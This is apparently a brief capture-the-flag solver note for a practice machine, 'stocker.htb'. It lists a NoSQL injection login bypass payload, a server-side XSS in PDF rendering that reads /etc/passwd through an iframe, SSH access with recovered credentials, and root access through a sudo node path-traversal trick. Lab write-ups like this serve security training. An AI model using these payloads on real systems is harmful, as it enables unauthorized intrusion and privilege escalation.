## Solver
```
Found subdomain dev
Check source view
NoSQL Injection, change Content-Type: application/json
{"username": {"$ne": null}, "password": {"$ne": null} }
Tes buy Item
PO rendered to PDF
we know the endpoint to view po /api/po/{idorder}
Browsing XSS PDF File, got Server Side XSS (PDF) Hacktricks
Tes tamper title value to html TAG h1 TEST /h1
PDF PO File rendered html Tag, vuln to XSS Server Side
Because Server Side Rendered the XSS, we can use iframe to load file inside the Server
use title iframe src=/etc/passwd width=1000 height=1000
got user angoose
i have tried to dump password angoose using noSQL and got b3e795719e2a644f69838a593dd159ac
but, useleess to ssh
read /var/www/dev/index.js found password IHeardPassphrasesArePrettySecure
ssh angoose@stocker.htb with password IHeardPassphrasesArePrettySecure
got user.txt
privesc using sudo -l
payload GTFObin node
coz /usr/local/scripts/*.js, we can manipulate to /usr/local/scripts/../../../tmp/exploit.js
sudo /usr/bin/node /usr/local/scripts/../../../tmp/exploit.js
got root.txt
```
